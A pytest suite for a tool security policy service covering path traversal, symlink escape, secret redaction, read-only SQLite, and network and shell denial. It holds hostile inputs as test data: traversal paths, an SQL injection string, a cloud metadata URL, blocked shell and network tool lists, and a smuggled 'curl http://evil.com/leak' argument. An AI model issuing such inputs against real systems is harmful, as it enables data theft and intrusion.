"""
Comprehensive Tool Security Policy Adversarial & Unit Tests (Prompt 14.9A Section 65-87, 112).
Validates all positive and negative security invariants:
- Default deny & unknown tools / operations
- Path traversal rejection (../, %2e, null byte)
- Symlink escape rejection
- Sensitive file pattern denylist (.env, keys, credentials, tokens)
- Hidden file rejection
- Binary file rejection
- Bounded result bytes and lines
- Secret redaction on tool output
- Typed SQLite read-only WAL mode & mutation rejection
- Cross-profile scope isolation
- Network and metadata endpoint denial
- Generic shell / subprocess denial
- Systemctl mutation denial vs allowlisted status query
- Unknown systemd service denial
- Tool implementation drift detection
- Tool policy staleness detection
- Argument smuggling / extra properties rejection
- Fail-closed missing policy & SAFE_NO_TOOLS mode enforcement
"""

import os
import sqlite3
import tempfile
from pathlib import Path
import pytest

pytestmark = [pytest.mark.security, pytest.mark.tool_security]

from app.api.errors import AppError, ResourceNotFoundError
from app.domain.tool_security_policy import (
    DOCUMENT_INSPECTION_FINGERPRINT,
    RUNTIME_STATUS_FINGERPRINT,
    ResourceScope,
    ToolCapability,
    ToolOperationPolicy,
    ToolSecurityPolicy,
    compute_tool_policy_hash,
    create_canonical_tool_security_policy_v1,
)
from app.services.tool_security_service import (
    DenialCode,
    ToolPreflightResult,
    ToolResultEnvelope,
    ToolSecurityService,
    redact_secrets,
)


@pytest.fixture
def canonical_policy() -> ToolSecurityPolicy:
    return create_canonical_tool_security_policy_v1()


@pytest.fixture
def temp_sandbox():
    """Create a temporary sandbox directory tree with allowed and outside folders."""
    with tempfile.TemporaryDirectory() as tmpdir:
        base = Path(tmpdir)
        docs_dir = base / "docs"
        docs_dir.mkdir(parents=True, exist_ok=True)
        outside_dir = base / "outside"
        outside_dir.mkdir(parents=True, exist_ok=True)

        # Create normal document
        normal_doc = docs_dir / "architecture.txt"
        normal_doc.write_text("Sagara Mission Control Architecture Overview\nAll systems nominal.\n", encoding="utf-8")

        # Create sensitive files in docs
        env_file = docs_dir / ".env"
        env_file.write_text("DATABASE_URL=postgres://admin:secret@localhost/db\n", encoding="utf-8")

        key_file = docs_dir / "id_rsa"
        key_file.write_text("-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0...\n-----END RSA PRIVATE KEY-----\n", encoding="utf-8")

        # Create secret outside
        outside_secret = outside_dir / "root_secret.txt"
        outside_secret.write_text("CLASSIFIED_OUTSIDE_SECRET_DATA", encoding="utf-8")

        yield base, docs_dir, outside_dir


# 1. Determinism and Policy Hash
@pytest.mark.smoke
def test_tool_policy_determinism(canonical_policy):
    p1 = create_canonical_tool_security_policy_v1()
    p2 = create_canonical_tool_security_policy_v1()
    assert p1.policy_hash == p2.policy_hash
    assert p1.policy_hash == "9bdd1d54102280e49f1d23a13be404c44bb0f22e2c3f100b8d6aed61e3ec033d"
    assert len(p1.approved_capabilities) == 2
    assert "runtime_status" in p1.approved_capabilities
    assert "document_inspection" in p1.approved_capabilities


# 2. Default Deny and Unknown Tool
def test_default_deny_and_unknown_tool(canonical_policy):
    res = ToolSecurityService.preflight_tool_request(
        policy=canonical_policy,
        profile_id="sagara-lab",
        tool_id="unapproved_arbitrary_tool",
        operation_id="run",
        arguments={},
        runtime_mode="SAFE_READ_ONLY",
    )
    assert res.allowed is False
    assert res.reason_code == DenialCode.TOOL_NOT_ALLOWED


# 3. Unknown Operation
def test_unknown_operation(canonical_policy):
    res = ToolSecurityService.preflight_tool_request(
        policy=canonical_policy,
        profile_id="sagara-lab",
        tool_id="runtime_status",
        operation_id="restart_service",
        arguments={"unit": "hermes-gateway.service"},
        runtime_mode="SAFE_READ_ONLY",
    )
    assert res.allowed is False
    assert res.reason_code == DenialCode.TOOL_OPERATION_NOT_ALLOWED


# 4. Positive Document Inspection
def test_positive_document_read(canonical_policy, temp_sandbox):
    base_dir, docs_dir, _ = temp_sandbox
    op = canonical_policy.approved_capabilities["document_inspection"].operations["read_text"]
    scope = canonical_policy.approved_capabilities["document_inspection"].resource_scope

    res = ToolSecurityService.execute_document_inspection(
        raw_path="docs/architecture.txt",
        max_bytes=4096,
        resource_scope=scope,
        op_policy=op,
        base_dir=base_dir,
    )
    assert isinstance(res, ToolResultEnvelope)
    assert res.tool_id == "document_inspection"
    assert res.operation_id == "read_text"
    assert "Architecture Overview" in res.content
    assert res.truncated is False
    assert res.is_untrusted_data is True


# 5. Path Traversal Denials
def test_path_traversal_denials(canonical_policy, temp_sandbox):
    base_dir, _, _ = temp_sandbox
    scope = canonical_policy.approved_capabilities["document_inspection"].resource_scope
    op = canonical_policy.approved_capabilities["document_inspection"].operations["read_text"]

    traversal_attempts = [
        "docs/../outside/root_secret.txt",
        "docs/../../root_secret.txt",
        "docs/%2e%2e/outside/root_secret.txt",
        "docs/architecture.txt\x00extra",
    ]

    for attempt in traversal_attempts:
        with pytest.raises(AppError) as exc_info:
            ToolSecurityService.execute_document_inspection(
                raw_path=attempt,
                max_bytes=4096,
                resource_scope=scope,
                op_policy=op,
                base_dir=base_dir,
            )
        assert exc_info.value.code in [DenialCode.PATH_TRAVERSAL, DenialCode.RESOURCE_SCOPE_DENIED]


# 6. Symlink Escape Denial
def test_symlink_escape_denial(canonical_policy, temp_sandbox):
    base_dir, docs_dir, outside_dir = temp_sandbox
    scope = canonical_policy.approved_capabilities["document_inspection"].resource_scope
    op = canonical_policy.approved_capabilities["document_inspection"].operations["read_text"]

    symlink_path = docs_dir / "escape_symlink.txt"
    try:
        symlink_path.symlink_to(outside_dir / "root_secret.txt")
    except (OSError, NotImplementedError):
        # On Windows without Developer Mode / SeCreateSymbolicLinkPrivilege, skip symlink creation
        pytest.skip("Symlink creation requires elevated permissions on this host")

    with pytest.raises(AppError) as exc_info:
        ToolSecurityService.execute_document_inspection(
            raw_path="docs/escape_symlink.txt",
            max_bytes=4096,
            resource_scope=scope,
            op_policy=op,
            base_dir=base_dir,
        )
    assert exc_info.value.code in [DenialCode.SYMLINK_ESCAPE, DenialCode.RESOURCE_SCOPE_DENIED]


# 7. Sensitive File Denials
def test_sensitive_file_denials(canonical_policy, temp_sandbox):
    base_dir, docs_dir, _ = temp_sandbox
    scope = canonical_policy.approved_capabilities["document_inspection"].resource_scope
    op = canonical_policy.approved_capabilities["document_inspection"].operations["read_text"]

    # .env inside allowed root
    with pytest.raises(AppError) as exc_info:
        ToolSecurityService.execute_document_inspection(
            raw_path="docs/.env",
            max_bytes=4096,
            resource_scope=scope,
            op_policy=op,
            base_dir=base_dir,
        )
    assert exc_info.value.code == DenialCode.SENSITIVE_FILE_DENIED

    # id_rsa inside allowed root
    with pytest.raises(AppError) as exc_info:
        ToolSecurityService.execute_document_inspection(
            raw_path="docs/id_rsa",
            max_bytes=4096,
            resource_scope=scope,
            op_policy=op,
            base_dir=base_dir,
        )
    assert exc_info.value.code == DenialCode.SENSITIVE_FILE_DENIED


# 8. Hidden File Denial
def test_hidden_file_denial(canonical_policy, temp_sandbox):
    base_dir, docs_dir, _ = temp_sandbox
    scope = canonical_policy.approved_capabilities["document_inspection"].resource_scope
    op = canonical_policy.approved_capabilities["document_inspection"].operations["read_text"]

    hidden_file = docs_dir / ".hidden_notes.txt"
    hidden_file.write_text("Private hidden notes", encoding="utf-8")

    with pytest.raises(AppError) as exc_info:
        ToolSecurityService.execute_document_inspection(
            raw_path="docs/.hidden_notes.txt",
            max_bytes=4096,
            resource_scope=scope,
            op_policy=op,
            base_dir=base_dir,
        )
    assert exc_info.value.code == DenialCode.SENSITIVE_FILE_DENIED


# 9. Binary File Denial
def test_binary_file_denial(canonical_policy, temp_sandbox):
    base_dir, docs_dir, _ = temp_sandbox
    scope = canonical_policy.approved_capabilities["document_inspection"].resource_scope
    op = canonical_policy.approved_capabilities["document_inspection"].operations["read_text"]

    binary_file = docs_dir / "firmware.bin"
    binary_file.write_bytes(b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00")

    with pytest.raises(AppError) as exc_info:
        ToolSecurityService.execute_document_inspection(
            raw_path="docs/firmware.bin",
            max_bytes=4096,
            resource_scope=scope,
            op_policy=op,
            base_dir=base_dir,
        )
    assert exc_info.value.code == DenialCode.BINARY_FILE_DENIED


# 10. Result Size and Line Bounds
def test_result_size_and_line_bounds(canonical_policy, temp_sandbox):
    base_dir, docs_dir, _ = temp_sandbox
    scope = canonical_policy.approved_capabilities["document_inspection"].resource_scope
    op = canonical_policy.approved_capabilities["document_inspection"].operations["read_text"]

    large_file = docs_dir / "large_doc.txt"
    large_file.write_text("Line of text data\n" * 2000, encoding="utf-8")

    res = ToolSecurityService.execute_document_inspection(
        raw_path="docs/large_doc.txt",
        max_bytes=1024,
        resource_scope=scope,
        op_policy=op,
        base_dir=base_dir,
    )
    assert res.truncated is True
    assert len(res.content) <= 1024


# 11. Secret Redaction
def test_secret_redaction(canonical_policy, temp_sandbox):
    base_dir, docs_dir, _ = temp_sandbox
    scope = canonical_policy.approved_capabilities["document_inspection"].resource_scope
    op = canonical_policy.approved_capabilities["document_inspection"].operations["read_text"]

    doc_with_secret = docs_dir / "api_guide.txt"
    doc_with_secret.write_text(
        "To authenticate with Sagara:\n"
        "Use key: sk-live1234567890abcdef1234567890\n"
        "And token: ghp_123456789012345678901234567890123456\n",
        encoding="utf-8",
    )

    res = ToolSecurityService.execute_document_inspection(
        raw_path="docs/api_guide.txt",
        max_bytes=4096,
        resource_scope=scope,
        op_policy=op,
        base_dir=base_dir,
    )
    assert res.redacted is True
    assert "sk-live" not in res.content
    assert "ghp_" not in res.content
    assert "[REDACTED_SECRET]" in res.content


# 12. Typed SQLite Read-Only WAL Mode
def test_sqlite_typed_readonly_mode():
    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
        db_path = Path(f.name)

    try:
        # Initialize DB with WAL mode and test session data
        conn = sqlite3.connect(db_path)
        conn.execute("PRAGMA journal_mode = WAL;")
        conn.execute(
            "CREATE TABLE sessions (session_id TEXT PRIMARY KEY, profile_id TEXT, created_at TEXT, status TEXT);"
        )
        conn.execute(
            "INSERT INTO sessions VALUES ('sess-001', 'sagara-lab', '2026-09-12T10:00:00Z', 'COMPLETED');"
        )
        conn.execute(
            "INSERT INTO sessions VALUES ('sess-002', 'personal', '2026-09-12T11:00:00Z', 'PRIVATE');"
        )
        conn.commit()
        conn.close()

        # Execute typed read-only query
        results = ToolSecurityService.execute_typed_sqlite_query(
            db_path=db_path,
            query_id="session_summary",
            profile_id="sagara-lab",
            allowed_profiles=["sagara-lab"],
            params=("sagara-lab",),
        )
        assert len(results) == 1
        assert results[0]["session_id"] == "sess-001"
        assert results[0]["profile_id"] == "sagara-lab"

        # Verify mutation attempt fails via read-only connection
        ro_conn = sqlite3.connect(f"file:{db_path.as_posix()}?mode=ro", uri=True)
        ro_conn.execute("PRAGMA query_only = ON;")
        with pytest.raises(sqlite3.OperationalError):
            ro_conn.execute("INSERT INTO sessions VALUES ('sess-003', 'sagara-lab', 'now', 'FAIL');")
        ro_conn.close()

    finally:
        if db_path.exists():
            try:
                os.remove(db_path)
            except OSError:
                pass


# 13. SQLite Mutation and Raw SQL Denial
def test_sqlite_arbitrary_sql_denial():
    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
        db_path = Path(f.name)

    try:
        conn = sqlite3.connect(db_path)
        conn.execute("CREATE TABLE test (id TEXT);")
        conn.commit()
        conn.close()

        # Model attempting arbitrary SQL
        with pytest.raises(AppError) as exc_info:
            ToolSecurityService.execute_typed_sqlite_query(
                db_path=db_path,
                query_id="DROP TABLE test; --",
                profile_id="sagara-lab",
                allowed_profiles=["sagara-lab"],
                params=(),
            )
        assert exc_info.value.code == DenialCode.TOOL_OPERATION_NOT_ALLOWED

    finally:
        if db_path.exists():
            try:
                os.remove(db_path)
            except OSError:
                pass


# 14. Cross-Profile Scope Isolation
def test_cross_profile_isolation_denial():
    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
        db_path = Path(f.name)

    try:
        conn = sqlite3.connect(db_path)
        conn.execute("CREATE TABLE sessions (session_id TEXT, profile_id TEXT, created_at TEXT, status TEXT);")
        conn.commit()
        conn.close()

        # sagara-lab caller attempting to query 'personal' profile private data
        with pytest.raises(AppError) as exc_info:
            ToolSecurityService.execute_typed_sqlite_query(
                db_path=db_path,
                query_id="session_summary",
                profile_id="sagara-lab",
                allowed_profiles=["personal"],  # Only personal profile allowed
                params=("personal",),
            )
        assert exc_info.value.code == DenialCode.RESOURCE_SCOPE_DENIED

    finally:
        if db_path.exists():
            try:
                os.remove(db_path)
            except OSError:
                pass


# 15. Network and Metadata Denial
def test_network_and_metadata_denial():
    forbidden_tools = [
        "network_request",
        "http_get",
        "fetch_url",
        "curl",
        "http://169.254.169.254/latest/meta-data",
    ]
    for tool_name in forbidden_tools:
        with pytest.raises(AppError) as exc_info:
            ToolSecurityService.evaluate_forbidden_tool(tool_name)
        assert exc_info.value.code == DenialCode.NETWORK_DENIED


# 16. Generic Shell Denial
def test_shell_denial():
    shell_tools = ["shell", "bash", "sh", "cmd", "powershell", "run_command", "exec_subprocess"]
    for tool_name in shell_tools:
        with pytest.raises(AppError) as exc_info:
            ToolSecurityService.evaluate_forbidden_tool(tool_name)
        assert exc_info.value.code == DenialCode.TOOL_NOT_ALLOWED


# 17. Systemctl Mutation Denial
def test_systemctl_mutation_denial(canonical_policy):
    res = ToolSecurityService.preflight_tool_request(
        policy=canonical_policy,
        profile_id="sagara-lab",
        tool_id="runtime_status",
        operation_id="restart",
        arguments={"unit": "hermes-gateway.service"},
        runtime_mode="SAFE_READ_ONLY",
    )
    assert res.allowed is False
    assert res.reason_code == DenialCode.TOOL_OPERATION_NOT_ALLOWED


# 18. Systemctl Status Allowed via Isolated Command Runner
def test_systemctl_status_allowed(canonical_policy):
    cap = canonical_policy.approved_capabilities["runtime_status"]
    op = cap.operations["inspect_service"]
    scope = cap.resource_scope

    def mock_runner(argv, timeout):
        assert argv == [
            "/usr/bin/systemctl",
            "--user",
            "show",
            "hermes-gateway.service",
            "--property=ActiveState,SubState,MainPID,NRestarts,ActiveEnterTimestamp,UnitFileState",
        ]
        return "ActiveState=active\nSubState=running\nMainPID=149218\nNRestarts=0\n"

    envelope = ToolSecurityService.execute_runtime_status(
        unit="hermes-gateway.service",
        properties=None,
        resource_scope=scope,
        op_policy=op,
        command_runner=mock_runner,
    )
    assert envelope.tool_id == "runtime_status"
    assert envelope.operation_id == "inspect_service"
    assert envelope.resource == "hermes-gateway.service"
    assert "MainPID=149218" in envelope.content
    assert envelope.is_untrusted_data is True


# 19. Unknown Systemd Service Denied
def test_systemctl_unknown_service_denied(canonical_policy):
    cap = canonical_policy.approved_capabilities["runtime_status"]
    op = cap.operations["inspect_service"]
    scope = cap.resource_scope

    with pytest.raises(AppError) as exc_info:
        ToolSecurityService.execute_runtime_status(
            unit="nginx.service",
            properties=None,
            resource_scope=scope,
            op_policy=op,
        )
    assert exc_info.value.code == DenialCode.RESOURCE_SCOPE_DENIED


# 20. Tool Implementation Drift
def test_tool_implementation_drift(canonical_policy):
    # Mutate implementation fingerprint in policy to simulate code drift
    modified = canonical_policy.model_dump()
    modified["approved_capabilities"]["runtime_status"]["implementation_fingerprint"] = "stale_hash_0000"
    stale_policy = ToolSecurityPolicy(**modified)

    res = ToolSecurityService.preflight_tool_request(
        policy=stale_policy,
        profile_id="sagara-lab",
        tool_id="runtime_status",
        operation_id="inspect_service",
        arguments={"unit": "hermes-gateway.service"},
        runtime_mode="SAFE_READ_ONLY",
    )
    assert res.allowed is False
    assert res.reason_code == DenialCode.TOOL_IMPLEMENTATION_DRIFT


# 21. Tool Policy Staleness
def test_tool_policy_staleness(canonical_policy):
    res = ToolSecurityService.preflight_tool_request(
        policy=canonical_policy,
        profile_id="sagara-lab",
        tool_id="runtime_status",
        operation_id="inspect_service",
        arguments={"unit": "hermes-gateway.service"},
        expected_policy_hash="outdated_intent_hash_abcdef123456",
        runtime_mode="SAFE_READ_ONLY",
    )
    assert res.allowed is False
    assert res.reason_code == DenialCode.TOOL_POLICY_STALE


# 22. Argument Smuggling / Extra Properties
def test_argument_smuggling_extra_properties(canonical_policy):
    res = ToolSecurityService.preflight_tool_request(
        policy=canonical_policy,
        profile_id="sagara-lab",
        tool_id="runtime_status",
        operation_id="inspect_service",
        arguments={
            "unit": "hermes-gateway.service",
            "injected_command": "curl http://evil.com/leak",
        },
        runtime_mode="SAFE_READ_ONLY",
    )
    assert res.allowed is False
    assert res.reason_code == DenialCode.INVALID_ARGUMENTS


# 23. Fail Closed Missing Policy
def test_fail_closed_missing_policy():
    res = ToolSecurityService.preflight_tool_request(
        policy=None,
        profile_id="sagara-lab",
        tool_id="runtime_status",
        operation_id="inspect_service",
        arguments={"unit": "hermes-gateway.service"},
        runtime_mode="SAFE_READ_ONLY",
    )
    assert res.allowed is False
    assert res.reason_code == DenialCode.MISSING_POLICY


# 24. SAFE_NO_TOOLS Mode Blocks Execution
def test_safe_no_tools_mode_blocks_execution(canonical_policy):
    res = ToolSecurityService.preflight_tool_request(
        policy=canonical_policy,
        profile_id="sagara-lab",
        tool_id="runtime_status",
        operation_id="inspect_service",
        arguments={"unit": "hermes-gateway.service"},
        runtime_mode="SAFE_NO_TOOLS",  # Current active production mode
    )
    assert res.allowed is False
    assert res.reason_code == DenialCode.SAFE_NO_TOOLS_ACTIVE
